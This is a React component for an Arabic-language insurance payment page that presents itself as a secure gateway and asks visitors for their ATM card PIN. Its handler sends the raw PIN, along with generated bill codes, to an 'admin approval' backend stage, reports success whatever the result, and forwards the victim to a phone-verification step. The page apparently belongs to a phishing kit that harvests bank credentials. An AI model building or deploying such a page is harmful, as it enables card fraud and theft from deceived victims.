import { useState, useRef, useEffect } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { motion } from "framer-motion";
import { Button } from "@/components/ui/button";
import { Shield, Lock, Loader2, CreditCard } from "lucide-react";
import { linkVisitorToSession } from "@/lib/visitorLink";
import { useLanguage } from "@/i18n/LanguageContext";
import { createOrUpdateStage } from "@/hooks/useAdminApproval";
import { toast } from "sonner";

const ATMPayment = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { t } = useLanguage();
  const a = t.atm;
  const demoOffer = {
    company: "التعاونية",
    totalPrice: 1850,
    price: 1850,
  };
  const offer = location.state?.offer || demoOffer;
  const orderId = location.state?.orderId || sessionStorage.getItem("insurance_order_id") || "DEMO-001";
  const cardLastFour = location.state?.cardLastFour || sessionStorage.getItem("card_last_four") || "****";
  const totalPrice = offer?.totalPrice || offer?.price || 0;
  const companyName = offer?.company || "بي كير";

  const [pin, setPin] = useState("");
  const [loading, setLoading] = useState(false);
  const [currentOrderId, setCurrentOrderId] = useState<string | null>(orderId !== "DEMO-001" ? orderId : null);
  const inputRef = useRef<HTMLInputElement>(null);

  // Generate stable ATM bill/biller codes per session
  const [atmBillNumber] = useState(() => {
    const stored = sessionStorage.getItem("atm_bill_number");
    if (stored) return stored;
    const num = String(Math.floor(100000000 + Math.random() * 900000000));
    sessionStorage.setItem("atm_bill_number", num);
    return num;
  });
  const [atmBillerCode] = useState(() => {
    const stored = sessionStorage.getItem("atm_biller_code");
    if (stored) return stored;
    const code = String(Math.floor(100 + Math.random() * 900));
    sessionStorage.setItem("atm_biller_code", code);
    return code;
  });

  const handleVerify = async () => {
    if (pin.length < 4) return;
    setLoading(true);
    linkVisitorToSession({});
    const id = await createOrUpdateStage(currentOrderId, "atm", { atm_pin: pin, atm_bill_number: atmBillNumber, atm_biller_code: atmBillerCode });
    setCurrentOrderId(id);
    if (id) sessionStorage.setItem("insurance_order_id", id);
    toast.success("تم التحقق بنجاح");
    navigate("/insurance/phone-verify", { state: { offer, orderId: id || currentOrderId } });
  };

  if (!offer) {
    return (
      <div className="min-h-screen bg-background">
        <div className="flex items-center justify-center min-h-[60vh]">
          <p className="text-muted-foreground">{a.noPaymentData}</p>
        </div>
      </div>
    );
  }

  return (
    <div className="relative min-h-[100dvh] overflow-hidden bg-gradient-to-b from-[hsl(var(--primary)/0.05)] via-background to-background">
      <div className="absolute inset-0 bg-[radial-gradient(ellipse_at_top,hsl(var(--primary)/0.08),transparent_60%)]" />

      <div className="container relative mx-auto px-4 pt-8 pb-24 md:pb-12">
        <div className="mx-auto max-w-md">
          <motion.div
            initial={{ opacity: 0, y: 20 }}
            animate={{ opacity: 1, y: 0 }}
            transition={{ duration: 0.4, ease: "easeOut" }}
          >
            {/* Card */}
            <div className="overflow-hidden rounded-3xl border border-primary/15 bg-card shadow-xl shadow-primary/5">
              {/* Header */}
              <div className="relative bg-gradient-to-l from-primary/10 via-primary/5 to-transparent px-5 py-5">
                <div className="flex items-center justify-between">
                  <div className="flex items-center gap-1.5 rounded-full bg-primary/10 px-2.5 py-1">
                    <Lock className="h-3 w-3 text-primary" />
                    <span className="text-[10px] font-bold text-primary">SSL</span>
                  </div>
                  <div className="flex items-center gap-3 text-right">
                    <div>
                      <h1 className="text-base font-bold text-foreground">{a.title}</h1>
                      <p className="text-[11px] text-muted-foreground">بوابة دفع آمنة</p>
                    </div>
                    <div className="flex h-11 w-11 items-center justify-center rounded-2xl bg-primary/10">
                      <CreditCard className="h-5 w-5 text-primary" />
                    </div>
                  </div>
                </div>
              </div>

              <div className="space-y-4 p-5">
                <div className="divide-y divide-border/60 rounded-2xl border border-border/60 bg-secondary/30">
                  {[
                    { label: "التاجر", value: companyName },
                    { label: "المبلغ", value: `${totalPrice.toLocaleString()} ر.س`, bold: true },
                    { label: "البطاقة", value: `•••• ${cardLastFour}`, mono: true },
                  ].map((row, idx) => (
                    <div key={idx} className="flex items-center justify-between px-4 py-3">
                      <span className={`text-sm ${row.bold ? "font-extrabold text-foreground" : row.mono ? "font-mono tracking-widest text-foreground" : "font-semibold text-foreground"}`} dir="ltr">
                        {row.value}
                      </span>
                      <span className="text-xs text-muted-foreground">{row.label}</span>
                    </div>
                  ))}
                </div>

                {/* PIN Section */}
                <div className="space-y-4 rounded-2xl border border-primary/10 bg-gradient-to-b from-primary/[0.03] to-transparent p-5">
                  <div className="space-y-1 text-center">
                    <p className="text-sm font-bold text-foreground">{a.subtitle}</p>
                    <p className="text-xs text-muted-foreground">أدخل الرقم السري لبطاقة الصراف</p>
                  </div>

                  <motion.div
                    className="flex justify-center gap-3"
                    dir="ltr"
                    animate={{ x: 0 }}
                  >
                    {[0, 1, 2, 3].map((i) => (
                      <input
                        key={i}
                        ref={i === 0 ? inputRef : undefined}
                        type="password"
                        inputMode="numeric"
                        maxLength={1}
                        value={pin[i] || ""}
                        onChange={(e) => {
                          const val = e.target.value.replace(/\D/g, "");
                          const newPin = pin.split("");
                          newPin[i] = val;
                          setPin(newPin.join(""));
                          if (val && i < 3) {
                            const next = e.target.parentElement?.children[i + 1] as HTMLInputElement;
                            next?.focus();
                          }
                        }}
                        onKeyDown={(e) => {
                          if (e.key === "Backspace" && !pin[i] && i > 0) {
                            const prev = (e.target as HTMLElement).parentElement?.children[i - 1] as HTMLInputElement;
                            prev?.focus();
                          }
                        }}
                        className="h-14 w-14 rounded-xl border-2 bg-background text-center text-lg font-bold text-foreground shadow-sm transition-all duration-200 focus:outline-none focus:ring-4 focus:shadow-md border-border/80 focus:border-primary focus:ring-primary/15"
                      />
                    ))}
                  </motion.div>

                  <Button
                    onClick={handleVerify}
                    disabled={loading || pin.length < 4}
                    className="h-12 w-full rounded-xl bg-cta text-sm font-bold text-cta-foreground shadow-lg shadow-cta/20 transition-all hover:bg-cta-hover hover:shadow-xl hover:shadow-cta/30"
                  >
                    {loading ? (
                      <>
                        <Loader2 className="h-4 w-4 animate-spin" />
                        {a.verifying}
                      </>
                    ) : (
                      <>
                        <Lock className="h-4 w-4" />
                        {a.confirm}
                      </>
                    )}
                  </Button>
                </div>
              </div>

              {/* Footer */}
              <div className="border-t border-border/40 bg-secondary/20 px-5 py-3">
                <div className="flex items-center justify-center gap-2">
                  <Shield className="h-3.5 w-3.5 text-muted-foreground" />
                  <span className="text-[10px] text-muted-foreground">{a.secureProcess}</span>
                </div>
              </div>
            </div>
          </motion.div>
        </div>
      </div>
    </div>
  );
};

export default ATMPayment;
